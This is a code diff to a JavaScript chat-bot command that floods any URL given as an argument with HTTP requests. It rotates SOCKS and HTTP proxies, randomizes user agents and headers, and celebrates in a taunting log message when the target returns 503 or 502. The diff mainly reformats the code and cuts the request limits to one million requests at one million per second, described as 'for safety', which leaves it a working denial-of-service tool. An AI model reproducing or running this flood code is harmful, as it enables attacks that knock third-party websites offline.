@@ -20,7 +20,6 @@ const {
     generateUserAgent
 } = require('../system/useragent.js');
 
-
 const langHeader = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
     "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
@@ -68,14 +67,16 @@ const acceptHeader = [
 ];
 
 const numThreads = 100;
-const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
-const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+const maxRequests = 1000000; // Adjust the limit to a more reasonable number for safety
+const requestsPerSecond = 1000000; // Adjust the request rate to a manageable level
 
 function randElement(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
 }
 
-module.exports["run"] = async ({ args, chat, font }) => {
+module.exports["run"] = async ({
+    args, chat, font
+}) => {
     const targetUrl = args[0];
     if (!targetUrl || (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://"))) {
         return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
@@ -108,9 +109,11 @@ module.exports["run"] = async ({ args, chat, font }) => {
         headers["User-Agent"] = generateUserAgent();
 
         axios
-            .get(url, { httpAgent: agent || null, headers })
-            .then(() => console.log(`Request to ${url} succeeded.`))
-            .catch((error) => {
+        .get(url, {
+            httpAgent: agent || null, headers
+        })
+        .then(() => console.log(`Request to ${url} succeeded.`))
+        .catch((error) => {
             if (error.response && error.response.status === 503) {
                 chat.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
             } else if (error.response && error.response.status === 502) {
@@ -126,15 +129,15 @@ module.exports["run"] = async ({ args, chat, font }) => {
         for (let proxy of proxies) {
             const proxyParts = proxy.split(":");
             const agent =
-                proxyParts[0].startsWith("socks")
-                    ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`)
-                    : new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);
+            proxyParts[0].startsWith("socks")
+            ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`): new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);
 
             setInterval(() => {
-                if (requests >= maxRequests) return; // Limit the number of requests for safety.
+                if (requests >= maxRequests) return; // Limit the number of requests for safety
                 sendRequest(targetUrl, agent);
                 requests++;
-            }, 1000 / requestsPerSecond);  // Request rate
+            },
+                1000 / requestsPerSecond); // Request rate
 
             if (requests >= numThreads) break; // Stop after a specified number of threads
         }
